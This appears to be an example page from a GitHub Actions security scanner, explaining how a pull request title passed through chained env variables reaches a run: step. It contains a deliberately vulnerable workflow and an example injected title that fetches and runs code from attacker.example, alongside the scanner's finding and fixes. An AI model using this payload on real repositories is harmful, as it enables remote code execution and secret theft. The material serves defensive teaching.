# 01 — Multi-hop env propagation (TAINT-GH-002)

A maintainer copies `github.event.pull_request.title` into one env var, then references that env var from another env var, then drops the final variable into a `run:` block. Each hop **looks** like sanitisation. None of them are.

## The workflow

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - env:
          RAW_TITLE: ${{ github.event.pull_request.title }}
          GREETING: "Thanks for opening: ${{ env.RAW_TITLE }}"
        run: |
          echo "$GREETING"
```

See [`.github/workflows/vulnerable.yml`](.github/workflows/vulnerable.yml) for the full file.

## Why it's wrong

GitHub Actions resolves `${{ env.RAW_TITLE }}` at workflow-parse time, not at shell-execution time. The chain `github.event.pull_request.title -> env.RAW_TITLE -> env.GREETING -> $GREETING` collapses to whatever bytes the attacker put in the PR title — by the time bash sees `$GREETING`, the indirection is gone.

A PR title of `widget"; curl http://attacker.example/x | bash; #` causes the runner to execute the injected command with the workflow's `GITHUB_TOKEN` and any bound secrets.

## Run it

```
taintly examples/01-multi-hop-env
```

Expected headline finding:

```
[CRITICAL] TAINT-GH-002: Attacker-controlled context reaches run: through multi-hop env propagation (deep taint)
  Code: taint: github.event.pull_request.title -> env.RAW_TITLE -> env.GREETING -> run: echo "$GREETING"
```

## How to fix

Two complementary fixes:

1. **Bind once, reference the variable, never re-interpolate.** Drop `env.GREETING`, reference `${{ github.event.pull_request.title }}` once into a quoted env var, then have `run:` reference `"$RAW_TITLE"` only:

   ```yaml
   - env:
       RAW_TITLE: ${{ github.event.pull_request.title }}
     run: |
       echo "Thanks for opening: $RAW_TITLE"
   ```

2. **Don't run on `pull_request_target` for cosmetic operations.** The greeting could ship on plain `pull_request` (no write context, no secrets) and post via a separate workflow gated on the bot identity.
